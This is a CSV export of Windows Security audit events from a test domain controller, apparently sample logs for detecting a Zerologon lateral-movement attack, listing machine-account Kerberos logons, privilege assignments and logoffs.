4,12139,2022-02-23 09:44:17.7088788,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E69B7,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E69B7""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
5,12140,2022-02-23 09:44:17.7089808,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,Successful logon,-\-," (::1)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E69B7,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E69B7""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""ca2fb08e-d68c-dbcf-0649-3b714c5c86c7""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
6,12141,2022-02-23 09:44:17.7117383,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E69FB,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E69FB""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
7,12142,2022-02-23 09:44:17.7118057,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Successful logon,-\-," (192.168.20.11)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E69FB,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E69FB""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""192.168.20.11""},{""@Name"":""IpPort"",""#text"":""51242""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
8,12143,2022-02-23 09:44:17.8157313,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,636,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E6A5C,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E6A5C""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
9,12144,2022-02-23 09:44:17.8158602,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,636,dc1.test.local,0,,Successful logon,-\-," (fe80::7191:d555:270f:4d0b)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E6A5C,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6A5C""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""ca2fb08e-d68c-dbcf-0649-3b714c5c86c7""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::7191:d555:270f:4d0b""},{""@Name"":""IpPort"",""#text"":""51243""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1840""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
10,12145,2022-02-23 09:44:17.8194554,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E69FB,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E69FB""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
11,12146,2022-02-23 09:44:17.8196653,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,636,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E69B7,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E69B7""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
12,12147,2022-02-23 09:44:17.8226793,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E68CE,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E68CE""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
13,12148,2022-02-23 09:44:18.5290359,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E6DCF,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E6DCF""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
14,12149,2022-02-23 09:44:18.5291529,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Successful logon,-\-," (fe80::7191:d555:270f:4d0b)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E6DCF,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6DCF""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::7191:d555:270f:4d0b""},{""@Name"":""IpPort"",""#text"":""51245""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
15,12150,2022-02-23 09:44:18.5302071,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,5280,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E6DEC,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E6DEC""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
16,12151,2022-02-23 09:44:18.5307738,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,636,dc1.test.local,0,,Successful logon,-\-," (fe80::7191:d555:270f:4d0b)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E6DEC,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6DEC""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::7191:d555:270f:4d0b""},{""@Name"":""IpPort"",""#text"":""51230""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
17,12152,2022-02-23 09:44:18.5343984,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,636,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E6DCF,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6DCF""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
18,12153,2022-02-23 09:44:18.5362778,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E6E54,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E6E54""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
19,12154,2022-02-23 09:44:18.5363834,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Successful logon,-\-," (fe80::7191:d555:270f:4d0b)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E6E54,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6E54""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::7191:d555:270f:4d0b""},{""@Name"":""IpPort"",""#text"":""51246""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
20,12155,2022-02-23 09:44:18.5404674,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,5280,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E6E54,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6E54""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
21,12156,2022-02-23 09:44:22.4510620,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2064,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E701E,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E701E""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
22,12157,2022-02-23 09:44:22.4511566,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2064,dc1.test.local,0,,Successful logon,-\-," (::1)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E701E,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E701E""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""51247""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
